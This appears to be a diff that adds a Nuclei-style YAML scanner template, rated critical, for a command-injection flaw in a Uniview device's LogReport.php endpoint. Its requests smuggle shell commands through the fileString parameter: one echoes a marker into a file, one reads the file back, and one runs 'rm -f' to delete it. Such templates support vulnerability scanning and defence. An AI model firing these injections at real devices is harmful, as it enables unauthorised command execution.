@@ -1,0 +1,29 @@
+id: yaml-poc-uniview-uniview-other-CT-446255
+info:
+  name: Yaml Poc Uniview Uniview Other Ct 446255
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-uniview-uniview-other-CT-446255'
+  tags: xpoc
+  reference:
+  - https://www.cnblogs.com/charon1937/p/14076959.html
+http:
+- method: GET
+  path:
+  - /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;echo%20{{s2}}>{{s1}}.txt
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /Interface/LogReport/{{s1}}.txt
+- method: GET
+  path:
+  - /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;rm%20-f%20{{s1}}.txt
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
